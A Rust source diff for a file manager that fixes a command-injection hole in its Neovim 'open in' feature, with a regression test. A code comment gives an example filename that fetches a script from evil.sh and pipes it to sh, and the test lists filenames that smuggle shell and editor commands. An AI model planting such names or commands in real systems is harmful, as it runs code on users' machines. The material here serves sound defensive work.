@@ -35,7 +35,7 @@ pub fn presets() -> Vec<Value> {
             true,
             "both",
             Some("editor"),
-            Some("nvim --server {socket} --remote-send '<Esc>:e {file}<CR>:{line}<CR>'"),
+            Some(NVIM_RPC),
             true,
         ),
         t("helix", "Helix", "hx", "hx {file}:{line}", true, "file", None, None, false),
@@ -246,6 +246,39 @@ fn alive(s: &mut Session) -> bool {
     matches!(s.child.try_wait(), Ok(None))
 }
 
+/// Neovim's reuse is not a shell template, and this marker in the preset's `reuse` field is what
+/// says so. It is never run as a command.
+///
+/// The template it replaces was `nvim --server {socket} --remote-send '<Esc>:e {file}<CR>:{line}<CR>'`.
+/// `--remote-send` does not take a filename — it takes keys to type into the running editor, and
+/// it reads `<…>` as keycodes. A file called `notes<CR>:!curl evil.sh|sh<CR>.txt`, a legal name on
+/// every filesystem kiki lists, therefore ran that command in the user's editor, as the user, and
+/// no amount of shell quoting could close it because the shell was never what interpreted the
+/// string. Picking such a file out of an unzipped archive or a folder copied down from a server
+/// and choosing Open in → Neovim was enough (docs/1.0.0/01-from-the-fork.md item 2).
+const NVIM_RPC: &str = "nvim-rpc";
+
+/// A Vim expression that opens `path` at `line` with the path as *data*: every character goes in
+/// as its number and comes back through `nr2char`, and `fnameescape` quotes the result for
+/// `:edit`. Nothing in a name can be an Ex command, an expression, or a keycode.
+fn nvim_expression(path: &str, line: u64) -> String {
+    let chars = path.chars().map(|c| (c as u32).to_string()).collect::<Vec<_>>().join(",");
+    format!("execute('edit ' . fnameescape(join(map([{chars}], 'nr2char(v:val)'), ''))) . execute('call cursor({}, 1)')", line.max(1))
+}
+
+/// `nvim --server <socket> --remote-expr <expr>`: four argv elements and no shell. Keyed by the
+/// tool's id, so the socket is the one that tool was started on — which also makes `nvim-rpc`
+/// something a second, differently-named nvim entry can ask for on purpose.
+fn nvim_reuse(id: &str, uris: &[Uri], line: Option<u64>) -> Result<Command, String> {
+    if uris.iter().any(|u| !u.is_local()) {
+        return Err("only local files can be opened in a tool; open the location's local folder instead".into());
+    }
+    let path = uris.first().map(Uri::to_path).unwrap_or_else(crate::config::home);
+    let mut cmd = Command::new("nvim");
+    cmd.arg("--server").arg(socket_path(id).map_err(|e| e.to_string())?).arg("--remote-expr").arg(nvim_expression(&path.to_string_lossy(), line.unwrap_or(1)));
+    Ok(cmd)
+}
+
 /// Launches (or reuses) the tool; returns (pid, reused).
 pub fn open(id_or_role: &str, uris: &[Uri], line: Option<u64>) -> Result<(u32, bool), String> {
     let tool = find(id_or_role).ok_or_else(|| format!("no tool {id_or_role}"))?;
@@ -258,9 +291,26 @@ pub fn open(id_or_role: &str, uris: &[Uri], line: Option<u64>) -> Result<(u32, b
     if running {
         if let Some(reuse) = tool.str_field("reuse") {
             let p = prepare(&tool, uris, line, reuse)?;
-            let st = Command::new("sh").arg("-c").arg(&p.command).current_dir(&p.cwd).envs(p.env.clone()).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).status().map_err(|e| e.to_string())?;
+            // What is asked for, not who asked: `nvim-rpc` means hand the file over nvim's own
+            // RPC instead of building a shell command. A `reuse` somebody wrote themselves stays
+            // theirs to choose, exactly as `command` is — `tests/e2e/run.sh` replaces both with
+            // `true` so that a test run starts no editor, and that has to keep working. What was
+            // wrong before 1.0.0 was the template kiki *shipped*, so that is what changed; a
+            // leftover copy of it in somebody's config is said out loud instead of silently
+            // overridden, because the key means what it says or it means nothing.
+            let (mut cmd, ran) = if reuse == NVIM_RPC {
+                (nvim_reuse(&id, uris, line)?, format!("nvim --remote-expr ({id})"))
+            } else {
+                if reuse.contains("--remote-send") {
+                    eprintln!("open-in: `reuse` for {id} hands a filename to --remote-send, which types it as keys, so a file with <CR> in its name can run commands in the editor. kiki's own Neovim reuse is `{NVIM_RPC}`, which cannot; dropping the override is the fix.");
+                }
+                let mut c = Command::new("sh");
+                c.arg("-c").arg(&p.command);
+                (c, p.command.clone())
+            };
+            let st = cmd.current_dir(&p.cwd).envs(p.env.clone()).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).status().map_err(|e| e.to_string())?;
             if !st.success() {
-                return Err(format!("reuse command failed: {}", p.command));
+                return Err(format!("reuse command failed: {ran}"));
             }
             let s = sessions.get_mut(&id).unwrap();
             for u in uris {
@@ -347,6 +397,48 @@ pub fn write_tools(list: &[Value]) -> std::io::Result<()> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// A file's name is data, never keys. The claim is about what Neovim does with the string,
+    /// not about what kiki built out of it, so it is driven through a real headless `nvim`: each
+    /// hostile name is opened by the very expression `nvim_reuse` sends, and the test asks nvim
+    /// which file it ended up in and on which line. The old `--remote-send` template would have
+    /// typed `x<CR>:!touch PWNED<CR>` as keys and run it.
+    #[test]
+    fn neovim_treats_hostile_filenames_as_data() {
+        if !on_path("nvim") {
+            eprintln!("nvim is not on PATH: nothing proved here — CI's container installs it so that this runs");
+            return;
+        }
+        let d = crate::scratch::Scratch::new("openin-nvim");
+        let result = d.join("result");
+        for name in ["$(touch PWNED)", "x';touch PWNED;'", "x|call writefile([], 'PWNED')", "x<CR>:!touch PWNED<CR>", "x<Esc>:qa!<CR>", "line\nbreak", "quote\" and \\ slash"] {
+            let path = d.join(name);
+            std::fs::write(&path, b"one\ntwo\nthree\n").unwrap();
+            // `eval` runs exactly what the daemon would put in `--remote-expr`; the doubled
+            // quotes are this `-c` argument's own escaping, not the expression's.
+            let out = Command::new("nvim")
+                .args(["--headless", "-u", "NONE", "-i", "NONE", "-n"])
+                .arg("-c")
+                .arg(format!("call eval('{}')", nvim_expression(&path.to_string_lossy(), 2).replace('\'', "''")))
+                .arg("-c")
+                .arg(format!("call writefile([json_encode([expand('%:p'), line('.')])], '{}')", result.display()))
+                .args(["-c", "qa!"])
+                .current_dir(&d)
+                .output()
+                .unwrap();
+            assert!(out.status.success(), "{name:?}: {}", String::from_utf8_lossy(&out.stderr));
+            let got = crate::json::parse(std::fs::read(&result).unwrap().as_slice()).unwrap();
+            let want = Value::Arr(vec![Value::Str(path.to_string_lossy().into_owned()), Value::Uint(2)]);
+            assert_eq!(got, want, "{name:?}: the file it opened and the line it sat on");
+            assert!(!d.join("PWNED").exists(), "{name:?}: a name must not run anything");
+            std::fs::remove_file(&result).unwrap();
+        }
+        // And what the daemon sends is argv, with no shell anywhere in it.
+        let cmd = nvim_reuse("neovim", &[Uri::from_path(&d.join("plain.txt"))], Some(2)).unwrap();
+        assert_eq!(cmd.get_program(), "nvim");
+        assert_eq!(cmd.get_args().count(), 4, "--server <socket> --remote-expr <expr>");
+        assert!(presets().iter().any(|t| t.str_field("id") == Some("neovim") && t.str_field("reuse") == Some(NVIM_RPC)), "the preset carries the marker, not a template");
+    }
 
     #[test]
     fn substitutes_and_quotes() {
